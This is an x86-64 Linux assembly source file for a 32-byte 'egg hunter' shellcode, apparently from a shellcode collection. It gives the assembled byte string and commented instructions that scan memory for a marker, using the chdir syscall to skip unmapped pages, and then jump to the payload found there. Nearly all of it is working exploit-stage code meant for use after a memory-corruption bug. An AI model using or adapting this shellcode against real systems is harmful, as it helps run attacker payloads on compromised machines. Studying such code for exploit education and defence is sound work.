; Author: Robert Catalin Raducioiu
; Shellcode: "\x31\xff\x66\x81\xcf\xff\x0f\x48\xff\xc7\x31\xc0\xb0\x50\x0f\x05\x3c\xf2\x74\xee\xb8\x73\x62\x63\x74\xff\xc8\xaf\x75\xec\xff\xd7"
; Shellcode length: 32 bytes

global _start

section .text

_start:

    ; start searching for the egg from the address 0x0
    xor edi, edi
    ; mov rdi, 0x7fffffff0000

NextPage:

    ; go to the next memory page (each one is 0x1000 bytes)
    or di, 0xfff
    
    ; go to the next memory address
    inc rdi

CheckAddress:

    ; call the syscall 80 (chdir)
    xor eax, eax
    mov al, 80
    syscall

    ; check if the last byte of RAX is equal to the last byte
    ; of the error EFAULT (0xfffffff2)
    cmp al, 0xf2
    jz NextPage

    ; set EAX to the egg
    mov eax, 0x74636273
    dec eax

    ; compare the egg with the bytes pointed to by RDI
    ; also increase RDI by 4
    scasd

    ; if it is not the egg, then go back and check the next address
    jnz CheckAddress

    ; jump at the beginning of the actual shellcode
    call rdi
